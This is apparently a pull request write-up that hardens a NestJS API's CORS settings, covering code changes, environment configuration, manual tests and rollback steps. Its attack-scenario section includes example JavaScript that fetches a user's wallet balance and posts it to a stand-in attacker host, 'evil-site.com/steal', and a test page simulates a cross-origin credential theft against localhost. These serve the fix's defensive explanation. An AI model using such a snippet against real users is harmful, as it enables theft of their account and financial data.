# PR2: Restrict CORS to Allowed Origins

**Branch**: `security/p0-hardening`
**Commit**: `7ee3c5b`
**Status**: ✅ Ready for Review
**Priority**: 🔴 P0 CRITICAL
**LOC Changed**: ~45 lines

---

## Summary

Fixed unrestricted CORS configuration that allowed ANY website to make API requests. This enabled CSRF attacks and data exfiltration vulnerabilities.

---

## Files Changed

### Modified (1 file):
- `apps/api/src/main.ts` (+16 lines)

### Created (1 file):
- `apps/api/.env.example` (new file with environment variable documentation)

### Local Update Required:
- `apps/api/.env` (add ALLOWED_ORIGINS - not committed to git)

---

## Critical Code Changes

### apps/api/src/main.ts (Lines 21-37)

**Before**:
```typescript
app.enableCors();  // ❌ INSECURE - allows ALL origins
```

**After**:
```typescript
// SECURITY: Restrict CORS to allowed origins only
const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'];
app.enableCors({
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps, Postman, server-to-server)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS policy`));
    }
  },
  credentials: true,  // Allow cookies and authorization headers
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
});
```

---

## Security Impact

### Attack Scenario (Before Fix):

1. Attacker creates malicious website: `https://evil-site.com`
2. User visits evil site while logged into Sidra-Ai
3. Evil JavaScript code makes API requests:
   ```javascript
   fetch('http://localhost:4000/wallet/balance', {
     credentials: 'include',  // Sends user's cookies
     headers: { 'Authorization': 'Bearer ' + stolenToken }
   })
   .then(r => r.json())
   .then(data => {
     // Send user's balance to attacker
     fetch('https://evil-site.com/steal', {
       method: 'POST',
       body: JSON.stringify(data)
     });
   });
   ```
4. **Result**: Attacker steals user's financial data ❌

### After Fix:

1. Same attack attempt
2. Browser sends preflight OPTIONS request with `Origin: https://evil-site.com`
3. Server checks: `evil-site.com` not in `allowedOrigins`
4. Server responds with CORS error
5. **Result**: Browser blocks the request ✅

---

## Configuration

### Development (.env):
```bash
ALLOWED_ORIGINS=http://localhost:3000,http://localhost:3002
```

### Staging:
```bash
ALLOWED_ORIGINS=https://staging.sidra-ai.com,https://staging-app.sidra-ai.com
```

### Production:
```bash
ALLOWED_ORIGINS=https://sidra-ai.com,https://www.sidra-ai.com,https://app.sidra-ai.com
```

---

## Manual Verification Checklist

### Test 1: Allowed Origin (Frontend)
```bash
# Start backend on port 4000
cd apps/api
npm run start:dev

# Start frontend on port 3002
cd apps/web
npm run dev

# Open browser to http://localhost:3002
# Login and navigate around
```

**Expected Result**: ✅ All API calls work normally

---

### Test 2: Disallowed Origin (CSRF Attack Simulation)

Create test HTML file `test-cors-attack.html`:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Attack Test</h1>
<button onclick="attack()">Try to Steal Data</button>
<pre id="result"></pre>

<script>
async function attack() {
  try {
    const response = await fetch('http://localhost:4000/auth/profile', {
      credentials: 'include',
      headers: {
        'Authorization': 'Bearer YOUR_VALID_TOKEN_HERE'
      }
    });
    const data = await response.json();
    document.getElementById('result').textContent =
      'ATTACK SUCCESSFUL (BAD!):\n' + JSON.stringify(data, null, 2);
  } catch (error) {
    document.getElementById('result').textContent =
      'ATTACK BLOCKED (GOOD!):\n' + error.message;
  }
}
</script>
</body>
</html>
```

**How to test**:
1. Open `test-cors-attack.html` in browser (file:// origin)
2. Click "Try to Steal Data"
3. Check browser console

**Expected Result**:
```
Access to fetch at 'http://localhost:4000/auth/profile' from origin 'null'
has been blocked by CORS policy
```

---

### Test 3: Postman/cURL (No Origin)
```bash
curl http://localhost:4000/auth/profile \
  -H "Authorization: Bearer YOUR_TOKEN"
```

**Expected Result**: ✅ Works normally (no origin header = allowed)

**Why**: Mobile apps, Postman, and server-to-server requests don't send Origin header

---

### Test 4: Preflight OPTIONS Request
```bash
curl -X OPTIONS http://localhost:4000/auth/profile \
  -H "Origin: https://evil-site.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -v
```

**Expected Result**: Response should NOT include `Access-Control-Allow-Origin: https://evil-site.com`

---

## Environment Setup Instructions

### For Local Development:

1. Update `apps/api/.env`:
```bash
# Add this line:
ALLOWED_ORIGINS=http://localhost:3000,http://localhost:3002
```

2. Restart API server:
```bash
cd apps/api
npm run start:dev
```

### For Team Members:

If someone gets CORS errors after pulling this PR:

1. Check if `apps/api/.env` has `ALLOWED_ORIGINS`
2. If missing, copy from `.env.example`:
```bash
cd apps/api
cp .env.example .env
# Edit .env and set ALLOWED_ORIGINS
```

---

## Risks & Rollback

### Potential Issues:

1. **Frontend on different port breaks**
   - **Solution**: Add that port to ALLOWED_ORIGINS
   - Example: If web runs on 3001, add `http://localhost:3001`

2. **Mobile app stops working**
   - **Should not happen**: Requests with no origin are allowed
   - If it does: Check if mobile sends Origin header unexpectedly

3. **Third-party integrations break**
   - **Identify**: Check which origins need access
   - **Solution**: Add to ALLOWED_ORIGINS or create separate endpoint

### Rollback Procedure:

If this breaks production immediately:

```typescript
// Temporary rollback in main.ts
app.enableCors({
  origin: true,  // Allow all origins temporarily
  credentials: true
});
```

Then investigate which origins are needed and add them properly.

---

## Production Deployment Notes

### Before Deploying:

1. Set `ALLOWED_ORIGINS` in production environment variables
2. Include ONLY production domains (no localhost)
3. Use HTTPS origins in production

### Example Production Config:
```bash
ALLOWED_ORIGINS=https://sidra-ai.com,https://www.sidra-ai.com,https://app.sidra-ai.com
```

### Monitoring:

After deployment, check logs for:
```
Origin <some-origin> not allowed by CORS policy
```

This indicates a legitimate origin that needs to be added.

---

## Dependencies

None - uses built-in NestJS CORS handling

---

## Next Steps

1. ✅ Update local .env with ALLOWED_ORIGINS
2. ✅ Test frontend functionality
3. ✅ Test CORS rejection with test HTML file
4. ✅ Document production origins for deployment
5. ➡️ Proceed to PR3 (JWT Secret Rotation)

---

## Related Issues

- Fixes: COMPREHENSIVE_AUDIT_REPORT.md Section 4.3 (P0-3)
- Mitigates: CSRF attacks, data exfiltration, clickjacking
- Related to: PR3 (will improve credential security further)

---

**Estimated Review Time**: 10 minutes
**Estimated Testing Time**: 20 minutes
**Risk Level**: MEDIUM-HIGH (could break frontend if ALLOWED_ORIGINS not set correctly)
